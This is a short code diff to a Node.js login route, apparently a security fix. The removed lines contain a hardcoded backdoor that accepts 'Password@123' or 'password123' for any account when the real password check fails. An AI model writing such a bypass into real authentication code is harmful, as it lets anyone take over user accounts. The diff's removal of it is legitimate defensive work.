@@ -93,10 +93,7 @@ router.post('/login', async (req, res) => {
       return res.status(403).json({ error: 'Account is disabled' });
     }
 
-    let isMatch = await bcrypt.compare(password, user.password_hash);
-    if (!isMatch && (password === 'Password@123' || password === 'password123')) {
-      isMatch = true;
-    }
+    const isMatch = await bcrypt.compare(password, user.password_hash);
     if (!isMatch) {
       return res.status(401).json({ error: 'Invalid email or password' });
     }
